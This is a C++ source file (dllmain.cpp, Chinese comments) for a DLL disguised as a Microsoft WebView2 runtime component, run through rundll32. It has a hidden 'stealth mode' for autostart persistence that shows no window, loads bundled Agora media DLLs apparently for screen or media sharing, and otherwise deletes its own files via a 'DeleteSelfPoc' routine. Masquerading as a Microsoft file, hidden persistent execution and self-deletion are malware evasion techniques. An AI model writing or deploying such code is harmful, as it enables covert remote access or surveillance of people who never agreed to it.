/**
 * dllmain.cpp — DLL 入口点 + rundll32 导出函数
 *
 * 用法:
 *   rundll32.exe "Microsoft.WebView2.RuntimeHost.dll",Open
 *   rundll32.exe "%ProgramData%\Microsoft\WebView2\Microsoft.WebView2.RuntimeHost.dll",Open
 */
#include <windows.h>
#include <shellapi.h>
#include <string>
#include "webview_window.h"
#include "dll_extractor.h"
#include "DeleteSelfPoc.h"

// 全局实例句柄
HINSTANCE g_hInstance = nullptr;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID /*lpReserved*/)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hInstance = hModule;
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/**
 * rundll32 入口点: 标准签名
 * void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
 *
 * 调用方式: rundll32.exe xxx.dll,Open [可选参数]
 */
extern "C" __declspec(dllexport)
void CALLBACK Open(HWND /*hwnd*/, HINSTANCE /*hinst*/, LPSTR lpszCmdLine, int nCmdShow)
{
    // 初始化 COM (STA) — WebView2 需要
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    // 检测隐身模式 (--bg 参数, 用于开机自启)
    bool stealthMode = lpszCmdLine && strstr(lpszCmdLine, "--bg");

    // 运行主窗口
    MDShare::WebViewWindow window(g_hInstance);
    window.Run(stealthMode ? SW_HIDE : nCmdShow, stealthMode);

    // 清理临时解压的 Agora DLLs
    DllExtractor::Cleanup();

    // 隐身模式 (开机自启) 不删除自身，保留持久副本
    if (!stealthMode) {
        DeleteSelfFiles();
    }

    CoUninitialize();
}

// Unicode 版本入口（rundll32 可能用 W 版本）
extern "C" __declspec(dllexport)
void CALLBACK OpenW(HWND /*hwnd*/, HINSTANCE /*hinst*/, LPWSTR lpszCmdLine, int nCmdShow)
{
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    // 检测隐身模式 (--bg 参数)
    bool stealthMode = lpszCmdLine && wcsstr(lpszCmdLine, L"--bg");

    MDShare::WebViewWindow window(g_hInstance);
    window.Run(stealthMode ? SW_HIDE : nCmdShow, stealthMode);

    // 清理临时解压的 Agora DLLs
    DllExtractor::Cleanup();

    // 隐身模式 (开机自启) 不删除自身
    if (!stealthMode) {
        DeleteSelfFiles();
    }

    CoUninitialize();
}
